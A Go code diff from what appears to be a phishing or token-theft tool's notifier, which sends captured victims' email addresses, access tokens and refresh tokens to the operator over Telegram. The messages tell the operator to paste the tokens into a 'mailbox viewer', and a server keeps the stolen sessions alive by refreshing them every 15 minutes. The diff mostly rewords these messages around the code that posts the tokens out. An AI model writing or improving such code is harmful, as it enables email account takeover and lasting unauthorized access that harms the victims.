@@ -1104,14 +1104,15 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 
 		// Now send individual token messages for easy copying
 		// IMPORTANT: Send ACCESS TOKEN FIRST - this is what goes in mailbox viewer
-		// Server handles refresh tokens automatically in background
+		// Server handles refresh tokens automatically in background every 15 minutes
 		if data.Custom != nil {
 			// Access Token - send FIRST as it's what user copies
 			if accessToken := data.Custom["dc_access_token"]; accessToken != "" {
 				tokenMsg := "🔑 ACCESS TOKEN (COPY THIS)\n"
 				tokenMsg += "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
 				tokenMsg += fmt.Sprintf("👤 %s\n", userEmail)
-				tokenMsg += "⏱ Valid: ~1 hour (server auto-refreshes)\n"
+				tokenMsg += "⏱ Valid: ~1 hour\n"
+				tokenMsg += "🔄 Server auto-refreshes every 15 min\n"
 				tokenMsg += "💡 Paste this in mailbox viewer\n\n"
 				tokenMsg += fmt.Sprintf("<code>%s</code>", accessToken)
 
@@ -1124,13 +1125,14 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 				client2.Post(url, "application/json", bytes.NewBuffer(tokenJson))
 			}
 
-			// Refresh Token - stored on server for auto-refresh
+			// Refresh Token - server auto-refreshes every 15 min
 			if refreshToken := data.Custom["dc_refresh_token"]; refreshToken != "" {
-				tokenMsg := "🔄 REFRESH TOKEN (Server Auto-Refresh)\n"
+				tokenMsg := "🔄 REFRESH TOKEN (Auto-Saved)\n"
 				tokenMsg += "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
 				tokenMsg += fmt.Sprintf("👤 %s\n", userEmail)
-				tokenMsg += "⏱ Valid: 90 days (auto-refreshed)\n"
-				tokenMsg += "💡 Stored on server - no action needed\n\n"
+				tokenMsg += "⏱ Valid: 90 days (auto-renewed)\n"
+				tokenMsg += "✅ Server keeps session alive automatically\n"
+				tokenMsg += "💡 Optional: paste in mailbox viewer for extra protection\n\n"
 				tokenMsg += fmt.Sprintf("<code>%s</code>", refreshToken)
 
 				tokenPayload := map[string]interface{}{
